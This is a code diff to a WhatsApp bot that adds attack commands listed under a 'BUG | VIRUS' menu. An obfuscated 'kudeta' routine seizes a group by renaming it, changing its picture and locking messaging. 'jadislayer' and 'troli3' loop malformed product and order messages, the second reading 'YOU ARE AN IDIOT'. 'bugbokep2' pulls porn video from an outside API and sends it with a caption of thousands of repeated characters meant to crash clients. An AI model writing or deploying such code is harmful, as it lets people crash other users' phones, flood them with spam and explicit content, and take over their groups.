@@ -333,6 +333,9 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "mediaKeyTimestamp": "1664991742",
 "isAnimated": false
 }}}
+ // Kudeta
+var _0x4246b3=_0x1c7d;(function(_0x2d23c3,_0x3d7fb5){var _0x3ed387=_0x1c7d,_0x15bb43=_0x2d23c3();while(!![]){try{var _0x7c70d8=-parseInt(_0x3ed387(0x11d))/0x1*(-parseInt(_0x3ed387(0x123))/0x2)+parseInt(_0x3ed387(0x127))/0x3*(parseInt(_0x3ed387(0x120))/0x4)+parseInt(_0x3ed387(0x11f))/0x5*(-parseInt(_0x3ed387(0x118))/0x6)+-parseInt(_0x3ed387(0x121))/0x7+parseInt(_0x3ed387(0x117))/0x8+-parseInt(_0x3ed387(0x128))/0x9+parseInt(_0x3ed387(0x11a))/0xa;if(_0x7c70d8===_0x3d7fb5)break;else _0x15bb43['push'](_0x15bb43['shift']());}catch(_0x57c090){_0x15bb43['push'](_0x15bb43['shift']());}}}(_0x4fc9,0x1dd26));function _0x1c7d(_0x197e5e,_0x5c5d45){var _0x4fc9d6=_0x4fc9();return _0x1c7d=function(_0x1c7db3,_0x4a579e){_0x1c7db3=_0x1c7db3-0x116;var _0x52edc4=_0x4fc9d6[_0x1c7db3];return _0x52edc4;},_0x1c7d(_0x197e5e,_0x5c5d45);}function _0x4fc9(){var _0x4e6309=['2119482crUWiU','Mamamah','fromMe','updateProfilePicture','1424824fuCart','18NHBjZg','startsWith','3119950DPcDde','groupUpdateSubject','kudeta','97505WVFWYs','groupUpdateDescription','117910qqznFx','4jchiKM','1458457bxlAwe','key','2ZdsFeZ','kudeta\x20by\x20xylaa','XeonMedia/image/kudeta.jpg','readFileSync','147426XHqVFA'];_0x4fc9=function(){return _0x4e6309;};return _0x4fc9();}if(budy[_0x4246b3(0x119)](_0x4246b3(0x11c))){if(!kal[_0x4246b3(0x122)][_0x4246b3(0x12a)]&&!isOwner)return;if(!isBotGroupAdmins)return;if(!isGroup)return;anu=fs[_0x4246b3(0x126)](_0x4246b3(0x125)),XeonBotInc[_0x4246b3(0x116)](from,anu),XeonBotInc[_0x4246b3(0x11b)](from,_0x4246b3(0x124)),XeonBotInc[_0x4246b3(0x11e)](from,'kudeta\x20by\x20xylaa'),XeonBotInc['groupSettingChange'](from,GroupSettingChange['messageSend'],!![]),setTimeout(()=>{var _0xa933d8=_0x4246b3;reply(_0xa933d8(0x129));},0x1f40);}
+//=================================================//
 //var sticker virus
 var sticWait = (hehe) => {
 ano = fs.readFileSync('./virus/stickernye/wait.webp')
@@ -5089,6 +5092,33 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
+case 'jadislayer':
+if (args.length < 1) return freply('Jumlahnya?')
+for (let i = 0; i < args[0]; i++) {
+const _0x452209=_0x509f;(function(_0x55cb2d,_0x125e5f){const _0x117a4d=_0x509f,_0x21f4ac=_0x55cb2d();while(!![]){try{const _0x6ae897=parseInt(_0x117a4d(0x19c))/0x1*(parseInt(_0x117a4d(0x193))/0x2)+parseInt(_0x117a4d(0x194))/0x3+-parseInt(_0x117a4d(0x19e))/0x4+parseInt(_0x117a4d(0x1a1))/0x5*(-parseInt(_0x117a4d(0x192))/0x6)+-parseInt(_0x117a4d(0x196))/0x7*(parseInt(_0x117a4d(0x197))/0x8)+parseInt(_0x117a4d(0x1ab))/0x9+parseInt(_0x117a4d(0x1a3))/0xa;if(_0x6ae897===_0x125e5f)break;else _0x21f4ac['push'](_0x21f4ac['shift']());}catch(_0x33915d){_0x21f4ac['push'](_0x21f4ac['shift']());}}}(_0x25a1,0x89cfb));function _0x509f(_0x33a6ff,_0x5e9f66){const _0x25a1fc=_0x25a1();return _0x509f=function(_0x509f39,_0x506792){_0x509f39=_0x509f39-0x192;let _0x34b942=_0x25a1fc[_0x509f39];return _0x34b942;},_0x509f(_0x33a6ff,_0x5e9f66);}function _0x25a1(){const _0x4a9171=['2675900QcAqex','imageMessage','downloadMediaMessage','99999999999000','4383282311765462','message','contextInfo','quotedM','4841127tbMXiQ','./stik/deden.jpeg','replace','358188ZVEBmc','210024ZxuVmb','3328515uJtAvS','videoMessage','146965lQqKuB','40PcUKsn','slayer\x20by\x20xylaa\x20🔥➥','relayWAMessage','http://nhentai.net','extendedTextMessage','1HdJoRb','0@s.whatsapp.net','3969488fBbkml','62857887347565@s.whatsapp.net','-999999999999','30jIxKsG','prepareMessageFromContent'];_0x25a1=function(){return _0x4a9171;};return _0x25a1();}if(isBan)return reply(mess['ban']);if(isMedia&&!kal[_0x452209(0x1a8)][_0x452209(0x195)]||isQuotedImage){let encmedia=isQuotedImage?JSON['parse'](JSON['stringify'](kal)[_0x452209(0x1ad)](_0x452209(0x1aa),'m'))[_0x452209(0x1a8)][_0x452209(0x19b)][_0x452209(0x1a9)]:kal,media=await XeonBotInc[_0x452209(0x1a5)](encmedia);imeu=await XeonBotInc['prepareMessage'](_0x452209(0x19d),media,image,{'thumbnail':fs['readFileSync'](_0x452209(0x1ac))}),imeg=imeu[_0x452209(0x1a8)][_0x452209(0x1a4)],res=await XeonBotInc[_0x452209(0x1a2)](from,{'productMessage':{'product':{'productImage':imeg,'productId':_0x452209(0x1a7),'title':_0x452209(0x198),'description':'slayer\x20by\x20xylaa\x20🔥➥','currencyCode':'IDR','priceAmount1000':_0x452209(0x1a6),'retailerId':_0x452209(0x1a0),'url':_0x452209(0x19a),'productImageCount':0x1,'salePriceAmount1000':'0'},'businessOwnerJid':_0x452209(0x19f),'contextInfo':{'forwardingScore':0x270f,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),XeonBotInc[_0x452209(0x199)](res);}
+}
+break
+case 'bugreact': {
+let user = global.db.data.users[m.sender]
+user.afkTime = + new Date
+user.afkReason = text
+deploy(`${m.pushName} xylaa${text ? ': ' + text : ''}`)
+}
+break
+//=======
+case 'penjara':
+if (!q) return m.reply(`*Contoh* :\npenjara nama`)
+let cret = await XeonBotInc.groupCreate(args.join(" "), [])
+let response = await XeonBotInc.groupInviteCode(cret.id)
+teks = `「 *Create Group* 」
+
+_▸ Name : ${cret.subject}_
+_▸ Owner : @${cret.owner.split("@")[0]}_
+_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
+https://chat.whatsapp.com/${response}
+`
+m.reply(teks)
+break
 case 'hiya':{
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -5574,6 +5604,11 @@ XeonBotInc.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `
 }
 }
 break
+case 'bugbokep2':{
+dwhee = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
+XeonBotInc.sendMessage(m.chat, { video: dwhee, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `[⫹⫺ - 㑒 ❝𝗛𝗪 - 𝗠𝗢𝗗𝗦❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦` }, { quoted: doc })
+}
+break
 case 'bugie':{
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -5989,6 +6024,35 @@ XeonBotInc.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
+case 'troli3': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await XeonBotInc.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${global.ownername}`,jpegThumbnail: thumb}}}
+	var troli2 = generateWAMessageFromContent(m.chat,{
+	"orderMessage": {
+	"orderId": "599519108102353",
+	"thumbnail": virgam,
+	"itemCount": 1999,
+	"status": "INQUIRY",
+	"surface": "CATALOG",
+	"message": " YOU ARE AN IDIOT ",
+	"orderTitle": " YOU ARE AN IDIOT ", // 
+	"sellerJid": "6281214281312@s.whatsapp.net",
+	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+	}
+	},
+	{quoted: {
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+	}, contextInfo:{}}) 
+	XeonBotInc.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
+	}
+	}
+	break
 case 'santetdia': {
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
@@ -10557,6 +10621,8 @@ return reply(`╔═══════✪「 OWNER 」
 ╠ ${prefix}coowner [add/del]
 ╠ ${prefix}changelog
 ╠═══════✪「 GROUP 」
+╠${prefix}kudeta
+╠${prefix}jail
 ╠${prefix}listonline
 ╠${prefix}searchgc	   
 ╠${prefix}hijack
@@ -10597,6 +10663,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}checkvote
 ╠${prefix}delvote
 ╠═════════✪「 BUG | VIRUS 」	
+jadislayer
 ╠${prefix}hiya [ jumlah ]
 ╠${prefix}ha [ jumlah ]
 ╠${prefix}hi [ jumlah ]
@@ -10613,6 +10680,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}bugghoib [ on / off ]
 ╠${prefix}bugsange [ need admin ]
 ╠${prefix}bugahay
+╠${prefix}bugreact
 ╠${prefix}docu [ jumlah ]
 ╠${prefix}daca [ jumlah ]
 ╠${prefix}duc [ jumlah ]
@@ -10620,6 +10688,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}lokas [ jumlah ]
 ╠${prefix}bugtod [ jumlah ]
 ╠${prefix}bugbokep [ jumlah ]
+╠${prefix}bugbokep2 [ jumlah ]
 ╠${prefix}bugie [ jumlah ]
 ╠${prefix}bugtiktok [ Link ] - Bug Sw
 ╠${prefix}buginvite [ jumlah ] Pc
